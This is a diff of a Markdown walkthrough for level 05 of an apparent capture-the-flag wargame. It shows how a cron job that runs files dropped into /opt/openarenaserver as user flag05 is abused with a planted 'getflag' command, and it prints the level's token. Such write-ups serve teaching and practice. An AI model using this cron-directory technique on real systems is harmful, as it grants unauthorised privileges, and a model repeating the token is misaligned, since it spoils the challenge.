@@ -1,19 +1,33 @@
 # Level 05
 
-If we reconnect using SSH, we can see we have a mail.
+On SSH login, `You have new mail` appears on stdout. Mails are stored at `/var/mail/$USER`.
 
-The mail represents a cron task:
+The mail represents a cron task.
 
-Minute / Heure / Jour/ Mois / Jour de la semaine
+```bash
+cat /var/mail/level05
+# */2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
+# Minute / Hour / Day / Month / Day of the week
+```
 
+The task launched is
 
+```bash
+cat /usr/sbin/openarenaserver
+#!/bin/sh
 
-Launches this exec with the user flag05
+for i in /opt/openarenaserver/* ; do
+	(ulimit -t 5; bash -x "$i")
+	rm -f "$i"
+done
+```
 
-/usr/sbin/openarenaserver
+`ulimit` info https://ss64.com/bash/ulimit.html
 
-So this script will executre all files inside /opt/openarenaserver/* bash them
+In this case, `ulimit` sets the maximum amount of cpu time to 5. `bash -x` starts bash in tracing mode. This script executes all scripts in `/opt/openarenaserver/` then deletes them. By placing a file and waiting 2 minutes, we can see that the cron job is on.
 
+```bash
 echo "getflag > /tmp/res" > test
-
-We wait and get the token
+cat /tmp/res
+# Check flag.Here is your token : viuaaale9huek52boumoomioc
+```
